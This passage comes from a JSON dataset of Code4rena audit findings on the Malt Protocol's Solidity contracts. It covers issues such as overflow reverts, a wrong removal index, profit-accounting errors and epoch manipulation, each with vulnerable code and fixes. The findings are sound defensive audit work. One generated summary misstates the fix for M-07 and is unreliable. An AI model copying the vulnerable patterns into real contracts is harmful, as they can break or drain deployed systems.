      "content": "\n<https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/StabilityPod/StabilizerNode.sol#L161> \n\n<https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/DataFeed/MaltDataLab.sol#L326>\n\n### Impact\n\nMaltDataLab fetched `priceCumulative` directly from Uniswap V2 pool to calculate price of Malt token. However, it is noticed that Uniswap V2 pool use Solidity 0.5.16, which does not revert when overflow happen. In addition, it is actually commented in Uniswap code that\n\n> *   never overflows, and + overflow is desired\n\n<https://github.com/Uniswap/v2-core/blob/ee547b17853e71ed4e0101ccfd52e70d5acded58/contracts/UniswapV2Pair.sol#L77-L81>\n\n```solidity\nif (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {\n    // * never overflows, and + overflow is desired\n    price0CumulativeLast += uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) * timeElapsed;\n    price1CumulativeLast += uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) * timeElapsed;\n}\n```\n\nHowever, MaltDataLab contracts use Solidity 0.8 and will revert when overflow. It will break the `stabilize()` function and always revert since `stabilize()` call to MaltDataLab contract to get state.\n\nPlease note that, with Solidity 0.5.16, when result of addition bigger than `max(uint256)`, it will overflow without any errors. For example, `max(uint256) + 2 = 1`.\n\nSo when `price0CumulativeLast` is overflow, the new value of `price0CumulativeLast` will be smaller than old value. As the result, when MaltDataLab doing a subtraction to calculate current price, it might get revert.\n\n### Proof of Concept\n\nFunction `stabilize()` will call to `MaltDataLab.trackPool()` first:\n\n<https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/StabilityPod/StabilizerNode.sol#L163>\n\n```solidity\nfunction stabilize() external nonReentrant onlyEOA onlyActive whenNotPaused {\n    // Ensure data consistency\n    maltDataLab.trackPool();\n    ...\n}\n```\n\nFunction `trackPool()` used a formula that will revert when `priceCumulative` overflow in Uniswap pool. \n\n<https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/DataFeed/MaltDataLab.sol#L323-L329>\n\n```solidity\nprice = FixedPoint\n    .uq112x112(\n      uint224(  \n        // @audit might overflow with solidity 0.8.0\n        (priceCumulative - maltPriceCumulativeLast) / \n          (blockTimestampLast - maltPriceTimestampLast)\n      )\n    )\n```\n\nScenario:\n\n1.  `maltPriceCumulativeLast = max(uint256 - 10)` and `price = 10, timeElapsed = 10`. So the new `priceCumulative = max(uint256 - 10) + 10 * 10 = 99 (overflow)`\n\n2.  When doing calculation in Malt protocol, `priceCumulative < maltPriceCumulativeLast`, so `priceCumulative - maltPriceCumulativeLast` will revert and fail\n\n### Recommended Mitigation Steps\n\nConsider using `unchecked` block to match handle overflow calculation in Uniswap V2.\n\n**[0xScotch (Malt) confirmed](https://github.com/code-423n4/2023-02-malt-findings/issues/15)**\n\n\n***\n\n",
      "summary": "\nThis bug report concerns the Malt Protocol, which is a decentralized, autonomous, and self-governed platform that provides users with a stable digital asset. The issue is related to overflow when calculating the price of the Malt token.\n\nThe Malt Protocol is built on two contracts, StabilizerNode and MaltDataLab. The StabilizerNode contract calls the MaltDataLab contract to get the state of the token price. The MaltDataLab contract fetches the priceCumulative value directly from the Uniswap V2 pool to calculate the price of Malt token.\n\nHowever, Uniswap V2 pool uses Solidity 0.5.16, which does not revert when an overflow occurs. The MaltDataLab contract, on the other hand, uses Solidity 0.8 and will revert when an overflow occurs. This will break the stabilize() function and always revert since stabilize() calls the MaltDataLab contract to get the state.\n\nThe proof of concept for this issue is that when the priceCumulative value is overflowed, the new value of the priceCumulative will be smaller than the old value. This will cause the subtraction in the MaltDataLab contract to get the current price to revert and fail.\n\nThe recommended mitigation step is to use an unchecked block to handle overflow calculations in the Uniswap V2 pool.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "https://github.com/code-423n4/2023-02-malt-findings/issues/15",
      "tags": [],
      "finders": [
        "minhquanym"
      ]
    },
    {
      "id": "16090",
      "title": "[M-12] Value of `totalProfit` might be wrong because of wrong logic in function `sellMalt()`",
      "impact": "MEDIUM",
      "content": "\nContract `SwingTraderManager` has a `totalProfit` variable. It keeps track of total profit swing traders made during `sellMalt()`. However, the logic for accounting is wrong so it will not have the correct value. As the results, it can affect other contracts that integrate with `SwingTraderManager` and use this `totalProfit` variable.\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/StabilityPod/SwingTraderManager.sol#L252-L258>\n\n```solidity\nif (amountSold + dustThreshold >= maxAmount) {\n  return maxAmount;\n}\n\ntotalProfit += profit; \n// @audit did not update because already return above\n\nemit SellMalt(amountSold, profit);\n```\n\nFunction `sellMalt()` has a dust check before returning result. `totalProfit` should be updated before this check as it returns the value immediately without updating `totalProfit`.\n\n### Recommended Mitigation Steps\n\nUpdating `totalProfit` before the dust check in function `sellMalt()`.\n\n**[0xScotch (Malt) confirmed](https://github.com/code-423n4/2023-02-malt-findings/issues/16)**\n\n***\n\n",
      "summary": "\nThis bug report discusses an issue with the `SwingTraderManager` contract, which keeps track of total profits made by swing traders. The logic for accounting for this value is incorrect, which can affect other contracts that integrate with `SwingTraderManager` and use the `totalProfit` variable. The proof of concept can be found at the given link. The issue was discovered through manual review, and the recommended mitigation step is to update `totalProfit` before the dust check in the `sellMalt()` function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "https://github.com/code-423n4/2023-02-malt-findings/issues/16",
      "tags": [],
      "finders": [
        "minhquanym",
        "cccz  hansfriese"
      ]
    },
    {
      "id": "16089",
      "title": "[M-11] RewardThrottle.setTimekeeper: If changing the timekeeper causes the epoch to change, it will mess up the system",
      "impact": "MEDIUM",
      "content": "\nRewardThrottle.setTimekeeper allows POOL_UPDATER_ROLE to update the timekeeper when RewardThrottle is active:\n\n```solidity\n  function setTimekeeper(address _timekeeper)\n    external\n    onlyRoleMalt(POOL_UPDATER_ROLE, \"Must have pool updater privs\")\n  {\n    require(_timekeeper != address(0), \"Not address 0\");\n    timekeeper = ITimekeeper(_timekeeper);\n  }\n```\n\nif newTimekeeper.epoch changes, it will cause the following:\n\n1.  The newTimekeeper.epoch increases, and the user can immediately call checkRewardUnderflow to fill the gap epoch, thereby distributing a large amount of rewards.\n2.  The newTimekeeper.epoch decreases, and the contract will use the state of the previous epoch. Since the state.rewarded has reached the upper limit, this will cause the current epoch to be unable to receive rewards.\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/RewardSystem/RewardThrottle.sol#L690-L696>\n\n### Recommended Mitigation Steps\n\nConsider only allowing setTimekeeper to be called when RewardThrottle is not active.\n\n**[0xScotch (Malt) confirmed and commented](https://github.com/code-423n4/2023-02-malt-findings/issues/21#issuecomment-1447036522):**\n > This is a good find and I think we will just remove the `setTimekeeper` methods. There is no reason for the timekeeper to ever be updated at this point given all it does it track epochs. \n> \n> Historically this method was there because what we now call the timekeeper was called the `MaltDAO` and was earmarked to be used for many other things other than timekeeping. Eventually we realised the timekeeping should be separated into its own thing. These methods were clearly forgotten about and not removed.\n\n\n***\n\n",
      "summary": "\nThis bug report concerns the RewardThrottle.setTimekeeper function in the RewardThrottle.sol contract. This function is used to update the timekeeper when the RewardThrottle is active. If the newTimekeeper.epoch changes, it can cause unexpected results. If the newTimekeeper.epoch increases, the user may be able to call checkRewardUnderflow to fill the gap epoch and distribute a large amount of rewards. If the newTimekeeper.epoch decreases, the contract will use the state of the previous epoch, which may prevent the current epoch from receiving rewards.\n\nTo mitigate this issue, it is recommended that setTimekeeper only be called when RewardThrottle is not active.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "https://github.com/code-423n4/2023-02-malt-findings/issues/21",
      "tags": [],
      "finders": [
        "cccz"
      ]
    },
    {
      "id": "16088",
      "title": "[M-10] StabilizerNode.stabilize may use undistributed rewards in the overflowPool as collateral",
      "impact": "MEDIUM",
      "content": "\nIn StabilizerNode.stabilize, `globalIC.collateralRatio()` is used to calculate SwingTraderEntryPrice and ActualPriceTarget, with collateralRatio indicating the ratio of the current global collateral to the malt supply.\n\n```solidity\n  function collateralRatio() public view returns (uint256) {\n    uint256 decimals = malt.decimals();\n    uint256 totalSupply = malt.totalSupply();\n    if (totalSupply == 0) {\n      return 0;\n    }\n    return (collateral.total * (10**decimals)) / totalSupply;\n  }\n```\n\nGlobal collateral includes the balance of collateral tokens in the overflowPool:\n\n```solidity\n  function getCollateralizedMalt() public view returns (PoolCollateral memory) {\n    uint256 target = maltDataLab.priceTarget(); // 是否选用  getActualPriceTarget()\n\n    uint256 unity = 10**collateralToken.decimals();\n\n    // Convert all balances to be denominated in units of Malt target price\n    uint256 overflowBalance = maltDataLab.rewardToMaltDecimals((collateralToken.balanceOf(\n      address(overflowPool)\n    ) * unity) / target);\n    uint256 liquidityExtensionBalance = (collateralToken.balanceOf(\n      address(liquidityExtension)\n    ) * unity) / target;\n    (\n      uint256 swingTraderMaltBalance,\n      uint256 swingTraderBalance\n    ) = swingTraderManager.getTokenBalances();\n    swingTraderBalance = (swingTraderBalance * unity) / target;\n\n    return\n      PoolCollateral({\n        lpPool: address(stakeToken),\n        // Note that swingTraderBalance also includes the overflowBalance\n        // Therefore the total doesn't need to include overflowBalance explicitly\n        total: maltDataLab.rewardToMaltDecimals(\n            liquidityExtensionBalance + swingTraderBalance\n        ),\n```\n\nIn StabilizerNode.stabilize, since the undistributed rewards in the overflowPool are not distributed, this can cause the actual collateral ratio to be large and thus affect the stabilize process.\n\nA simple example is:\n\n1.  `impliedCollateralService.syncGlobalCollateral()` is called to synchronize the latest data.\n2.  There are some gap epochs in RewardThrottle and their rewards are not distributed from the overflowPool.\n3.  When StabilizerNode.stabilize is called, it treats the undistributed rewards in the overflowPool as collateral, thus making `globalIC.collateralRatio()` large, and the results of maltDataLab. getActualPriceTarget/getSwingTraderEntryPrice will be incorrect, thus making stabilize incorrect.\n\nSince stabilize is a core function of the protocol, stabilizing with the wrong data is likely to cause malt to be depegged, so the vulnerability should be High risk.\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/StabilityPod/StabilizerNode.sol#L161-L176>\n\n### Recommended Mitigation Steps\n\nCall RewardThrottle.checkRewardUnderflow at the beginning of StabilizerNode.stabilize to distribute the rewards in the overflowPool, then call `impliedCollateralService.syncGlobalCollateral()` to synchronize the latest data.\n\n```diff\n  function stabilize() external nonReentrant onlyEOA onlyActive whenNotPaused {\n    // Ensure data consistency\n    maltDataLab.trackPool();\n\n    // Finalize auction if possible before potentially starting a new one\n    auction.checkAuctionFinalization();\n\n+  RewardThrottle.checkRewardUnderflow();\n+  impliedCollateralService.syncGlobalCollateral();\n\n    require(\n      block.timestamp >= stabilizeWindowEnd || _stabilityWindowOverride(),\n      \"Can't call stabilize\"\n    );\n```\n\n**[0xScotch (Malt) disagreed with severity and commented](https://github.com/code-423n4/2023-02-malt-findings/issues/22#issuecomment-1447033033):**\n > By a strict implementation of the protocol this is a bug as it would result in global collateral being slightly misreported and therefore downstream decisions being made on incorrect data. However, in practice, the chances of a big gap in epochs is very low due to the incentivization to upkeep that as well as the degree to which the global IC would be incorrect would be very small. It seems very unlikely this bug would ever lead to a depeg as stated.\n> \n> Let's say 50% of the Malt float is in staked LP and the current APR is 10%. We go for 48 epochs (24 hours) without any call to `checkRewardUnderflow`. This means the global IC will be misreported by 24 hours of APR (10%). \n> \n> The current APR is 10% and 50% of float is staked, therefore the yearly rewards represent 5% of the total float. One day worth of that is 5% / 365 = 0.013%.\n> \n> Therefore we can say that under the above stated circumstances the global IC would be misquoted by 0.02%. Seems very unlikely that discrepancy would be the cause of a depeg.\n\n**[Picodes (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-02-malt-findings/issues/22#issuecomment-1455167697):**\n > Downgrading to Medium as it indeed seems that the reporting error would remain low and it is unlikely that this could lead to a depeg.\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the StabilizerNode.stabilize function of the StabilityPod contract. The vulnerability occurs when globalIC.collateralRatio() is used to calculate SwingTraderEntryPrice and ActualPriceTarget, with collateralRatio indicating the ratio of the current global collateral to the malt supply. Global collateral includes the balance of collateral tokens in the overflowPool, which is not distributed. This can cause the actual collateral radio to be large and thus affect the stabilize process, potentially leading to malt being depegged.\n\nA proof of concept can be found at the given link.\n\nThe recommended mitigation steps are to call RewardThrottle.checkRewardUnderflow at the beginning of StabilizerNode.stabilize to distribute the rewards in the overflowPool, then call impliedCollateralService.syncGlobalCollateral() to synchronize the latest data.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "https://github.com/code-423n4/2023-02-malt-findings/issues/22",
      "tags": [],
      "finders": [
        "cccz"
      ]
    },
    {
      "id": "16087",
      "title": "[M-09] `Repository._removeContract()` removes the contract wrongly.",
      "impact": "MEDIUM",
      "content": "\nAfter removing the contract, the `contracts` array would contain the wrong contract names.\n\n### Proof of Concept\n\n`Repository._removeContract()` removes the contract name from `contracts` array.\n\n```solidity\nFile: 2023-02-malt\\contracts\\Repository.sol\n223:   function _removeContract(string memory _name) internal {\n224:     bytes32 hashedName = keccak256(abi.encodePacked(_name));\n225:     Contract storage currentContract = globalContracts[hashedName];\n226:     currentContract.contractAddress = address(0);\n227:     currentContract.index = 0;\n228: \n229:     uint256 index = currentContract.index; //@audit wrong index\n230:     string memory lastContract = contracts[contracts.length - 1];\n231:     contracts[index] = lastContract;\n232:     contracts.pop();\n233:     emit RemoveContract(hashedName);\n234:   }\n```\n\nBut it uses the already changed index(= 0) and replaces the last name with 0 index all the time.\n\nAs a result, the contracts array will still contain the removed name and remove the valid name at index 0.\n\n### Recommended Mitigation Steps\n\nWe should use the original index like below.\n\n```solidity\n  function _removeContract(string memory _name) internal {\n    bytes32 hashedName = keccak256(abi.encodePacked(_name));\n    Contract storage currentContract = globalContracts[hashedName];\n\n    uint256 index = currentContract.index; //++++++++++++++\n\n    currentContract.contractAddress = address(0);\n    currentContract.index = 0;\n\n    string memory lastContract = contracts[contracts.length - 1];\n    contracts[index] = lastContract;\n    contracts.pop();\n    emit RemoveContract(hashedName);\n  }\n```\n**[0xScotch (Malt) confirmed](https://github.com/code-423n4/2023-02-malt-findings/issues/25)**\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the `Repository._removeContract()` function in the `Repository.sol` file. The function is responsible for removing a contract name from the `contracts` array. The bug is that the function uses the already changed index (which is 0) and replaces the last name with 0 index all the time. As a result, the contracts array will still contain the removed name and remove the valid name at index 0. The impact of this bug is that after removing the contract, the `contracts` array would contain the wrong contract names.\n\nThe bug was identified using manual review. The recommended mitigation steps are to use the original index in the `_removeContract()` function. The code for this is provided in the bug report.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "https://github.com/code-423n4/2023-02-malt-findings/issues/25",
      "tags": [],
      "finders": [
        "KingNFT",
        "hansfriese"
      ]
    },
    {
      "id": "16086",
      "title": "[M-08] `LinearDistributor.declareReward()` might revert after changing `vestingDistributor`.",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-02-malt/blob/main/contracts/RewardSystem/LinearDistributor.sol#L114> \n\n<https://github.com/code-423n4/2023-02-malt/blob/main/contracts/RewardSystem/LinearDistributor.sol#L227>\n\n### Impact\n\n`LinearDistributor.declareReward()` might revert after changing `vestingDistributor` due to uint underflow.\n\n### Proof of Concept\n\nIn `LinearDistributor.sol`, there is a [setVestingDistributor()](https://github.com/code-423n4/2023-02-malt/blob/main/contracts/RewardSystem/LinearDistributor.sol#L222-L228) function to update `vestingDistributor`.\n\nAnd in `declareReward()`, it calculates the `netVest` and `netTime` by subtracting the previous amount and time.\n\n```solidity\nFile: 2023-02-malt\\contracts\\RewardSystem\\LinearDistributor.sol\n112:     uint256 currentlyVested = vestingDistributor.getCurrentlyVested();\n113: \n114:     uint256 netVest = currentlyVested - previouslyVested; //@audit revert after change vestingDistributor\n115:     uint256 netTime = block.timestamp - previouslyVestedTimestamp;\n116: \n```\n\nBut there is no guarantee that the vested amount of the new `vestingDistributor` is greater than the previously saved amount after changing the distributor.\n\nFurthermore, there is no option to change `previouslyVested` beside this declareReward() function and it will keep reverting unless the admin change back the distributor.\n\n### Recommended Mitigation Steps\n\nI think it would resolve the above problem if we change the previous amounts as well while updating the distributor.\n\n```solidity\n  function setVestingDistributor(address _vestingDistributor, uint _previouslyVested, uint _previouslyVestedTimestamp)\n    external\n    onlyRoleMalt(ADMIN_ROLE, \"Must have admin privs\")\n  {\n    require(_vestingDistributor != address(0), \"SetVestDist: No addr(0)\");\n    vestingDistributor = IVestingDistributor(_vestingDistributor);\n\n    previouslyVested = _previouslyVested;\n    previouslyVestedTimestamp = _previouslyVestedTimestamp;\n  }\n```\n\n**[0xScotch (Malt) confirmed and commented](https://github.com/code-423n4/2023-02-malt-findings/issues/28#issuecomment-1447006469):**\n > Setting `previouslyVested` during the `setVestingDistributor` call seems like a sufficient solution to this.\n\n\n***\n\n",
      "summary": "\nThis bug report focuses on the `LinearDistributor.declareReward()` function in the `LinearDistributor.sol` file of the 2023-02-malt repository on GitHub. The function might revert after changing `vestingDistributor` due to uint underflow. This occurs because the `declareReward()` function calculates the `netVest` and `netTime` by subtracting the previous amount and time, but there is no guarantee that the vested amount of the new `vestingDistributor` is greater than the previously saved amount after changing the distributor.\n\nThe impact of this bug is that there is no option to change `previouslyVested` beside this declareReward() function and it will keep reverting unless the admin change back the distributor. This was discovered through a manual review.\n\nThe recommended mitigation step is to change the previous amounts as well while updating the distributor. This can be done by adding the following code to the `setVestingDistributor()` function:\n\n```solidity\n  function setVestingDistributor(address _vestingDistributor, uint _previouslyVested, uint _previouslyVestedTimestamp)\n    external\n    onlyRoleMalt(ADMIN_ROLE, \"Must have admin privs\")\n  {\n    require(_vestingDistributor != address(0), \"SetVestDist: No addr(0)\");\n    vestingDistributor = IVestingDistributor(_vestingDistributor);\n\n    previouslyVested = _previouslyVested;\n    previouslyVestedTimestamp = _previouslyVestedTimestamp;\n  }\n```\n\nBy implementing this code, the bug can be resolved and the `declareReward()` function will no longer revert.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "https://github.com/code-423n4/2023-02-malt-findings/issues/28",
      "tags": [],
      "finders": [
        "hansfriese"
      ]
    },
    {
      "id": "16085",
      "title": "[M-07] `RewardThrottle._sendToDistributor()` reverts if one distributor is inactive.",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-02-malt/blob/main/contracts/RewardSystem/RewardThrottle.sol#L602> \n\n<https://github.com/code-423n4/2023-02-malt/blob/main/contracts/RewardSystem/LinearDistributor.sol#L101>\n\n### Impact\n\n`RewardThrottle._sendToDistributor()` reverts if one distributor is inactive.\n\n### Proof of Concept\n\n`RewardThrottle._sendToDistributor()` distributes the rewards to several distributors according to their allocation ratios.\n\n```solidity\nFile: 2023-02-malt\\contracts\\RewardSystem\\RewardThrottle.sol\n575:   function _sendToDistributor(uint256 amount, uint256 epoch) internal {\n576:     if (amount == 0) {\n577:       return;\n578:     }\n579: \n580:     (\n581:       uint256[] memory poolIds,\n582:       uint256[] memory allocations,\n583:       address[] memory distributors\n584:     ) = bonding.poolAllocations();\n585: \n586:     uint256 length = poolIds.length;ratio\n587:     uint256 balance = collateralToken.balanceOf(address(this));\n588:     uint256 rewarded;\n589: \n590:     for (uint256 i; i < length; ++i) {\n591:       uint256 share = (amount * allocations[i]) / 1e18;\n592: \n593:       if (share == 0) {\n594:         continue;\n595:       }\n596: \n597:       if (share > balance) {\n598:         share = balance;\n599:       }\n600: \n601:       collateralToken.safeTransfer(distributors[i], share);\n602:       IDistributor(distributors[i]).declareReward(share); //@audit will revert if one distributor is inactive\n```\n\nAnd `LinearDistributor.declareReward()` has an `onlyActive` modifier and it will revert in case of `inactive`.\n\n```solidity\nFile: 2023-02-malt\\contracts\\RewardSystem\\LinearDistributor.sol\n098:   function declareReward(uint256 amount)\n099:     external\n100:     onlyRoleMalt(REWARDER_ROLE, \"Only rewarder role\")\n101:     onlyActive\n102:   {\n```\n\nAs a result, `RewardThrottle._sendToDistributor()` will revert if one distributor is inactive rather than working with active distributors only.\n\n### Recommended Mitigation Steps\n\nI think it's logical to continue to work with active distributors in `_sendToDistributor()`.\n\n**[0xScotch (Malt) confirmed](https://github.com/code-423n4/2023-02-malt-findings/issues/29)**\n\n\n***\n\n",
      "summary": "\nThis bug report is about the `RewardThrottle._sendToDistributor()` function in the code-423n4/2023-02-malt repository, which is used to distribute rewards to several distributors according to their allocation ratios. The issue is that this function will revert if one of the distributors is inactive, rather than working with active distributors only. This was discovered through manual review.\n\nThe recommended mitigation step is to ensure that `_sendToDistributor()` only works with active distributors. This can be done by adding the `onlyActive` modifier to the `LinearDistributor.declareReward()` function, which will ensure that the function only works with active distributors.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "https://github.com/code-423n4/2023-02-malt-findings/issues/29",
      "tags": [],
      "finders": [
        "hansfriese"
      ]
    },
    {
      "id": "16084",
      "title": "[M-06] Average `APR`s might be calculated wrongly after calling `populateFromPreviousThrottle()`.",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2023-02-malt/blob/main/contracts/RewardSystem/RewardThrottle.sol#L660> \n\n<https://github.com/code-423n4/2023-02-malt/blob/main/contracts/RewardSystem/RewardThrottle.sol#L139>\n\n### Impact\n\nAverage `APR`s might be calculated wrongly after calling `populateFromPreviousThrottle()` and `targetAPR` might be changed unexpectedly.\n\n### Proof of Concept\n\nThe epoch state struct contains `cumulativeCashflowApr` element and `cashflowAverageApr` is used to adjust `targetAPR` in `updateDesiredAPR()` function.\n\nAnd `populateFromPreviousThrottle()` is an admin function to change `activeEpoch` and the relevant epoch state using the previous throttle.\n\nAnd the `activeEpoch` is likely to be increased inside this function.\n\n```solidity\n  function populateFromPreviousThrottle(address previousThrottle, uint256 epoch)\n    external\n    onlyRoleMalt(ADMIN_ROLE, \"Only admin role\")\n  {\n    RewardThrottle previous = RewardThrottle(previousThrottle);\n    uint256 _activeEpoch = activeEpoch; // gas\n\n    for (uint256 i = _activeEpoch; i < epoch; ++i) {\n      (\n        uint256 profit,\n        uint256 rewarded,\n        uint256 bondedValue,\n        uint256 desiredAPR,\n        uint256 epochsPerYear,\n        uint256 cumulativeCashflowApr,\n        uint256 cumulativeApr\n      ) = previous.epochData(i);\n\n      state[i].bondedValue = bondedValue;\n      state[i].profit = profit;\n      state[i].rewarded = rewarded;\n      state[i].epochsPerYear = epochsPerYear;\n      state[i].desiredAPR = desiredAPR;\n      state[i].cumulativeCashflowApr = cumulativeCashflowApr;\n      state[i].cumulativeApr = cumulativeApr;\n    }\n\n    activeEpoch = epoch;\n  }\n```\n\nThe problem might occur when `epoch < _activeEpoch + smoothingPeriod` because `state[epoch].cumulativeCashflowApr`and `state[epoch - smoothingPeriod].cumulativeCashflowApr` will be used for `cashflowAverageApr` calculation.\n\nSo `cumulativeCashflowApr` of the original epoch and the newly added epoch will be used together and `cashflowAverageApr` might be calculated wrongly.\n\nAs a result, `targetAPR` might be changed unexpectedly.\n\n### Recommended Mitigation Steps\n\nRecommend checking `epoch - _activeEpoch > smoothingPeriod` in `populateFromPreviousThrottle()`.\n\n**[0xScotch (Malt) confirmed](https://github.com/code-423n4/2023-02-malt-findings/issues/30)**\n\n\n***\n\n",
      "summary": "\nThis bug report concerns a vulnerability in the RewardThrottle.sol contract of the 2023-02-malt repository on GitHub. The vulnerability could cause the Average Annual Percentage Rate (APR) to be calculated incorrectly and the target APR to be changed unexpectedly after calling the populateFromPreviousThrottle() function.\n\nThe issue is caused by the incorrect use of the cumulativeCashflowApr element in the epoch state struct. In the populateFromPreviousThrottle() function, the cumulativeCashflowApr of the original epoch and the newly added epoch are used together to calculate the cashflowAverageApr. If the epoch is less than _activeEpoch + smoothingPeriod, the calculation will be incorrect and the target APR will be changed unexpectedly.\n\nThe bug was found through manual review. The recommended mitigation step is to check that epoch - _activeEpoch > smoothingPeriod in the populateFromPreviousThrottle() function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "https://github.com/code-423n4/2023-02-malt-findings/issues/30",
      "tags": [],
      "finders": [
        "hansfriese"
      ]
    },
    {
      "id": "16083",
      "title": "[M-05] `StabilizerNode.stabilize()` should update `lastTracking` as well to avoid an unnecessary incentive.",
      "impact": "MEDIUM",
      "content": "\n`StabilizerNode.stabilize()` should update `lastTracking` as well to avoid an unnecessary incentive.\n\nCurrent logic pays unnecessary incentives to track the pool.\n\n### Proof of Concept\n\n`trackPool()` pays an incentive per `trackingBackoff` in order to ensure pool consistency.\n\n```solidity\nFile: 2023-02-malt\\contracts\\StabilityPod\\StabilizerNode.sol\n248:   function trackPool() external onlyActive {\n249:     require(block.timestamp >= lastTracking + trackingBackoff, \"Too early\"); //@audit lastTracking should be updated in stabilize() also\n250:     bool success = maltDataLab.trackPool();\n251:     require(success, \"Too early\");\n252:     malt.mint(msg.sender, (trackingIncentive * (10**malt.decimals())) / 100); // div 100 because units are cents\n253:     lastTracking = block.timestamp;\n254:     emit Tracking();\n255:   }\n```\n\nAnd `stabilize()` tracks the pool as well and we don't need to pay an incentive unnecessarily in `trackPool()` if `stabilize()` was called recently.\n\nFor that, we can update `lastTracking` in `stabilize()`.\n\n### Recommended Mitigation Steps\n\nRecommend updating `lastTracking` in `stabilize()`.\n\n```solidity\n  function stabilize() external nonReentrant onlyEOA onlyActive whenNotPaused {\n    // Ensure data consistency\n    maltDataLab.trackPool();\n    lastTracking = block.timestamp; //++++++++++++++++\n\n    ...\n```\n\n**[0xScotch (Malt) confirmed](https://github.com/code-423n4/2023-02-malt-findings/issues/32)**\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code for the StabilizerNode contract in the 2023-02-malt repository on Github. The vulnerability is that the contract pays an unnecessary incentive to track the pool, as the current logic does not update the 'lastTracking' variable. The proof of concept provided in the report shows that the 'trackPool' function pays an incentive per 'trackingBackoff' in order to ensure pool consistency, but 'stabilize' also tracks the pool and the incentive should not be paid if 'stabilize' was called recently. The tools used for the manual review were manual review. The recommended mitigation step is to update the 'lastTracking' variable in the 'stabilize' function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "https://github.com/code-423n4/2023-02-malt-findings/issues/32",
      "tags": [],
      "finders": [
        "hansfriese"
      ]
    },
    {
      "id": "16082",
      "title": "[M-04] `SwingTraderManager.swingTraders()` shoudn't contain duplicate `traderContract`s.",
      "impact": "MEDIUM",
      "content": "\nIf `SwingTraderManager.swingTraders()` contains duplicate `traderContract`s, several functions like `buyMalt()` and `sellMalt()` wouldn't work as expected as they work according to traders' balances.\n\n### Proof of Concept\n\nDuring the swing trader addition, there is no validation that each trader should have a unique `traderContract`.\n\n```solidity\n  function addSwingTrader(\n    uint256 traderId,\n    address _swingTrader, //@audit should be unique\n    bool active,\n    string calldata name\n  ) external onlyRoleMalt(ADMIN_ROLE, \"Must have admin privs\") {\n    SwingTraderData storage trader = swingTraders[traderId];\n    require(traderId > 2 && trader.id == 0, \"TraderId already used\");\n    require(_swingTrader != address(0), \"addr(0)\");\n\n    swingTraders[traderId] = SwingTraderData({\n      id: traderId,\n      index: activeTraders.length,\n      traderContract: _swingTrader,\n      name: name,\n      active: active\n    });\n\n    activeTraders.push(traderId);\n\n    emit AddSwingTrader(traderId, name, active, _swingTrader);\n  }\n```\n\nSo the same `traderContract` might have 2 or more `traderId`s.\n\nWhen we check `buyMalt()` as an example, it distributes the ratio according to the trader balance and it wouldn't work properly if one trader contract is counted twice and receives more shares that it can't manage.\n\nSimilarly, other functions wouldn't work as expected and return the wrong result.\n\n### Recommended Mitigation Steps\n\nRecommend adding a new mapping like `activeTraderContracts` to check if the contract is added already or not.\n\nThen we can check the trader contract is added only once.\n\n**[0xScotch (Malt) confirmed](https://github.com/code-423n4/2023-02-malt-findings/issues/34)**\n\n\n***\n\n",
